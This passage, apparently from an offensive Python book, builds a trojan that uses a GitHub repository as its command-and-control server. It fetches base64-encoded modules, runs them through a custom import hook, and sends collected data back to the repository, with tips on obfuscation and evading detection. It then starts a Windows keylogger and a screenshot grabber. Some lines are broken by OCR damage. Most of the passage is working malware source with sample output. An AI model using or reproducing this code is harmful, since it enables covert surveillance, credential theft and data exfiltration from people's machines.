you’d want the capability to generate trojans, set their ID, automatically
create a configuration file that’s pushed to GitHub, and then compile the
trojan into an executable. We won’t build a botnet today, though; I’ll let
your imagination do the work.
Now let’s put the relevant GitHub code in place.
def connect_to_github():
gh = login(username="yourusername",password="yourpassword")
repo = gh.repository("yourusername","chapter7")
branch = repo.branch("master")
return gh,repo,branch
2. You can check out py2exe here: http://www.py2exe.org/.
GitHub Command and Control 105
def get_file_contents(filepath):
gh,repo,branch = connect_to_github()
tree = branch.commit.commit.tree.recurse()
for filename in tree.tree:
if filepath in filename.path:
print "[*] Found file %s" % filepath
blob = repo.blob(filename._json_data['sha'])
return blob.content
return None
def get_trojan_config():
global configured
config_json = get_file_contents(trojan_config)
config = json.loads(base64.b64decode(config_json))
configured = True
for task in config:
if task['module'] not in sys.modules:
exec("import %s" % task['module'])
return config
def store_module_result(data):
gh,repo,branch = connect_to_github()
remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
repo.create_file(remote_path,"Commit message",base64.b64encode(data))
return
These four functions represent the core interaction between the trojan
and GitHub. The connect_to_github function simply authenticates the user
to the repository, and retrieves the current repo and branch objects for use
by other functions. Keep in mind that in a real-world scenario, you want to
obfuscate this authentication procedure as best as you can. You might also
want to think about what each trojan can access in your repository based
on access controls so that if your trojan is caught, someone can’t come
along and delete all of your retrieved data. The get_file_contents function
is responsible for grabbing files from the remote repo and then reading
the contents in locally. This is used both for reading configuration options
as well as reading module source code. The get_trojan_config function is
responsible for retrieving the remote configuration document from the
repo so that your trojan knows which modules to run. And the final func-
tion store_module_result is used to push any data that you’ve collected on the
target machine. Now let’s create an import hack to import remote files from
our GitHub repo.
106 Chapter 7
Hacking Python’s import Functionality
If you’ve made it this far in the book, you know that we use Python’s import
functionality to pull in external libraries so that we can use the code con-
tained within. We want to be able to do the same thing for our trojan, but
beyond that, we also want to make sure that if we pull in a dependency
(such as Scapy or netaddr), our trojan makes that module available to all
subsequent modules that we pull in. Python allows us to insert our own
functionality into how it imports modules, such that if a module cannot be
found locally, our import class will be called, which will allow us to remotely
retrieve the library from our repo. This is achieved by adding a custom class
to the sys.meta_path list.3 Let’s create a custom loading class now by adding
the following code:
class GitImporter(object):
def __init__(self):
self.current_module_code = ""
def find_module(self,fullname,path=None):
if configured:
print "[*] Attempting to retrieve %s" % fullname
u new_library = get_file_contents("modules/%s" % fullname)
if new_library is not None:
v self.current_module_code = base64.b64decode(new_library)
return self
return None
def load_module(self,name):
w module = imp.new_module(name)
x exec self.current_module_code in module.__dict__
y sys.modules[name] = module
return module
Every time the interpreter attempts to load a module that isn’t available,
our GitImporter class is used. The find_module function is called first in an
attempt to locate the module. We pass this call to our remote file loader u
and if we can locate the file in our repo, we base64-decode the code and
store it in our class v. By returning self, we indicate to the Python inter-
preter that we found the module and it can then call our load_module func-
tion to actually load it. We use the native imp module to first create a new
blank module object w and then we shovel the code we retrieved from
GitHub into it x. The last step is to insert our newly created module into
the sys.modules list y so that it’s picked up by any future import calls. Now
let’s put the finishing touches on the trojan and take it for a spin.
3. An awesome explanation of this process written by Karol Kuczmarski can be found here:
http://xion.org.pl/2012/05/06/hacking-python-imports/.
GitHub Command and Control 107
def module_runner(module):
task_queue.put(1)
u result = sys.modules[module].run()
task_queue.get()
# store the result in our repo
v store_module_result(result)
return
# main trojan loop
w sys.meta_path = [GitImporter()]
while True:
if task_queue.empty():
x config = get_trojan_config()
for task in config:
y t = threading.Thread(target=module_runner,args=(task['module'],))
t.start()
time.sleep(random.randint(1,10))
time.sleep(random.randint(1000,10000))
We first make sure to add our custom module importer w before we
begin the main loop of our application. The first step is to grab the con-
figuration file from the repo x and then we kick off the module in its own
thread y. While we’re in the module_runner function, we simply call the mod-
ule’s run function u to kick off its code. When it’s done running, we should
have the result in a string that we then push to our repo v. The end of our
trojan will then sleep for a random amount of time in an attempt to foil any
network pattern analysis. You could of course create a bunch of traffic to
Google.com or any number of other things in an attempt to disguise what
your trojan is up to. Now let’s take it for a spin!
Kicking the Tires
All right! Let’s take this thing for a spin by running it from the com-
mand line.
warning If you have sensitive information in files or environment variables, remember that
without a private repository, that information is going to go up to GitHub for the
whole world to see. Don’t say I didn’t warn you—and of course you can use some
encryption techniques from Chapter 9.
108 Chapter 7
$ python git_trojan.py
[*] Found file abc.json
[*] Attempting to retrieve dirlister
[*] Found file modules/dirlister
[*] Attempting to retrieve environment
[*] Found file modules/environment
[*] In dirlister module
[*] In environment module.
Perfect. It connected to my repository, retrieved the configuration file,
pulled in the two modules we set in the configuration file, and ran them.
Now if you drop back in to your command line from your trojan direc-
tory, enter:
$ git pull origin master
From https://github.com/blackhatpythonbook/chapter7
* branch master -> FETCH_HEAD
Updating f4d9c1d..5225fdf
Fast-forward
data/abc/29008.data | 1 +
data/abc/44763.data | 1 +
2 files changed, 2 insertions(+), 0 deletions(-)
create mode 100644 data/abc/29008.data
create mode 100644 data/abc/44763.data
Awesome! Our trojan checked in the results of our two running
modules.
There are a number of improvements and enhancements that you
can make to this core command-and-control technique. Encryption of all
your modules, configuration, and exfiltrated data would be a good start.
Automating the backend management of pull-down data, updating configu-
ration files, and rolling out new trojans would also be required if you were
going to infect on a massive scale. As you add more and more functionality,
you also need to extend how Python loads dynamic and compiled libraries.
For now, let’s work on creating some standalone trojan tasks, and I’ll leave it
to you to integrate them into your new GitHub trojan.
GitHub Command and Control 109
8
common t rojaning t asks
on winDows
When you deploy a trojan, you want to perform a few
common tasks: grab keystrokes, take screenshots, and
execute shellcode to provide an interactive session to
tools like CANVAS or Metasploit. This chapter focuses
on these tasks. We’ll wrap things up with some sand-
box detection techniques to determine if we are run-
ning within an antivirus or forensics sandbox. These
modules will be easy to modify and will work within our trojan framework.
In later chapters, we’ll explore man-in-the-browser-style attacks and privi-
lege escalation techniques that you can deploy with your trojan. Each tech-
nique comes with its own challenges and probability of being caught by the
end user or an antivirus solution. I recommend that you carefully model
your target after you’ve implanted your trojan so that you can test the mod-
ules in your lab before trying them on a live target. Let’s get started by cre-
ating a simple keylogger.
keylogging for Fun and keystrokes
Keylogging is one of the oldest tricks in the book and is still employed with
various levels of stealth today. Attackers still use it because it’s extremely effec-
tive at capturing sensitive information such as credentials or conversations.
An excellent Python library named PyHook1 enables us to easily trap
all keyboard events. It takes advantage of the native Windows function
SetWindowsHookEx, which allows you to install a user-defined function to
be called for certain Windows events. By registering a hook for keyboard
events, we are able to trap all of the keypresses that a target issues. On
top of this, we want to know exactly what process they are executing these
keystrokes against, so that we can determine when usernames, passwords,
or other tidbits of useful information are entered. PyHook takes care of
all of the low-level programming for us, which leaves the core logic of the
keystroke logger up to us. Let’s crack open keylogger.py and drop in some
of the plumbing:
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
def get_current_process():
# get a handle to the foreground window
u hwnd = user32.GetForegroundWindow()
# find the process ID
pid = c_ulong(0)
v user32.GetWindowThreadProcessId(hwnd, byref(pid))
# store the current process ID
process_id = "%d" % pid.value
# grab the executable
executable = create_string_buffer("\x00" * 512)
w h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
x psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
# now read its title
window_title = create_string_buffer("\x00" * 512)
y length = user32.GetWindowTextA(hwnd, byref(window_title),512)
1. Download PyHook here: http://sourceforge.net/projects/pyhook/.
112 Chapter 8
# print out the header if we're in the right process
print
 print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_¬
title.value)
print
# close handles
kernel32.CloseHandle(hwnd)
kernel32.CloseHandle(h_process)
All right! So we just put in some helper variables and a function that
will capture the active window and its associated process ID. We first call
GetForeGroundWindow u, which returns a handle to the active window on the
target’s desktop. Next we pass that handle to the GetWindowThreadProcessId v
function to retrieve the window’s process ID. We then open the process w
and, using the resulting process handle, we find the actual executable
name x of the process. The final step is to grab the full text of the win-
dow’s title bar using the GetWindowTextA y function. At the end of our helper
function we output all of the information  in a nice header so that you
can clearly see which keystrokes went with which process and window. Now
let’s put the meat of our keystroke logger in place to finish it off.
def KeyStroke(event):
global current_window
# check to see if target changed windows
u if event.WindowName != current_window:
current_window = event.WindowName
get_current_process()
# if they pressed a standard key
v if event.Ascii > 32 and event.Ascii python keylogger-hook.py
[ PID: 3836 - cmd.exe - C:\WINDOWS\system32\cmd.exe -
c:\Python27\python.exe key logger-hook.py ]
t e s t
[ PID: 120 - IEXPLORE.EXE - Bing - Microsoft Internet Explorer ]
w w w . n o s t a r c h . c o m [Return]
[ PID: 3836 - cmd.exe - C:\WINDOWS\system32\cmd.exe -
c:\Python27\python.exe keylogger-hook.py ]
[Lwin] r
[ PID: 1944 - Explorer.EXE - Run ]
114 Chapter 8
c a l c [Return]
[ PID: 2848 - calc.exe - Calculator ]
1 [Lshift] + 1 =
You can see that I typed the word test into the main window where
the keylogger script ran. I then fired up Internet Explorer, browsed to
www.nostarch.com, and ran some other applications. We can now safely say
that our keylogger can be added to our bag of trojaning tricks! Let’s move
on to taking screenshots.
taking screenshots
Most pieces of malware and penetration testing frameworks include the
capability to take screenshots against the remote target. This can help
capture images, video frames, or other sensitive data that you might not
see with a packet capture or keylogger. Thankfully, we can use the PyWin32
package (see “Installing the Prerequisites” on page 138) to make native
calls to the Windows API to grab them.
A screenshot grabber will use the Windows Graphics Device Interface
(GDI) to determine necessary properties such as the total screen size, and
to grab the image. Some screenshot software will only grab a picture of the
currently active window or application, but in our case we want the entire
screen. Let’s get started. Crack open screenshotter.py and drop in the follow-
ing code:
import win32gui
import win32ui